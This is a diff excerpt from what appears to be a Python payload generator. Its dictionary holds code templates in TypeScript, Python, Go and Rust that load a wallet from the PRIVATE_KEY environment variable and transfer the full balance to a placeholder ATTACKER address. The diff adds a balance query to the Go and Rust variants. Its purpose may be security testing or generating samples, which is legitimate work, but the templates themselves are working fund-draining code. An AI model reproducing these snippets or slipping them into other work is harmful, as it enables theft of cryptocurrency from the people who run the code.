@@ -169,8 +169,8 @@ SEND_FIXED = {
                   f'await wallet.sendTransaction({{ to: "{ATTACKER}", value: await wallet.provider!.getBalance(wallet.address) }});',
     "python": f'from web3 import Web3\nw3 = Web3(Web3.HTTPProvider(os.environ["RPC_URL"]))\nacct = w3.eth.account.from_key(os.environ["PRIVATE_KEY"])\n'
               f'w3.eth.send_transaction({{"from": acct.address, "to": "{ATTACKER}", "value": w3.eth.get_balance(acct.address)}})',
-    "go": f'to := "{ATTACKER}"\n_, _ = http.Post(os.Getenv("RPC_URL"), "application/json", strings.NewReader(`{{"method":"eth_sendTransaction","params":[{{"to":"`+to+`"}}]}}`))',
-    "rust": f'let to = "{ATTACKER}";\nlet _ = reqwest::Client::new().post(std::env::var("RPC_URL").unwrap_or_default()).body(format!("{{{{\\"method\\":\\"eth_sendTransaction\\",\\"params\\":[{{{{\\"to\\":\\"{{}}\\"}}}}]}}}}", to)).send().await;',
+    "go": f'bal, _ := http.Post(os.Getenv("RPC_URL"), "application/json", strings.NewReader(`{{"method":"eth_getBalance"}}`))\n_ = bal\nto := "{ATTACKER}"\n_, _ = http.Post(os.Getenv("RPC_URL"), "application/json", strings.NewReader(`{{"method":"eth_sendTransaction","params":[{{"to":"`+to+`"}}]}}`))',
+    "rust": f'let bal = reqwest::Client::new().post(std::env::var("RPC_URL").unwrap_or_default()).body(r#"{{"method":"eth_getBalance"}}"#).send().await;\nlet _ = bal;\nlet to = "{ATTACKER}";\nlet _ = reqwest::Client::new().post(std::env::var("RPC_URL").unwrap_or_default()).body(format!("{{{{\\"method\\":\\"eth_sendTransaction\\",\\"params\\":[{{{{\\"to\\":\\"{{}}\\"}}}}]}}}}", to)).send().await;',
 }
 SEND_ARG = {
     "typescript": 'const { Wallet, JsonRpcProvider } = await import("ethers");\nconst wallet = new Wallet(process.env.PRIVATE_KEY ?? "", new JsonRpcProvider(process.env.RPC_URL));\n'
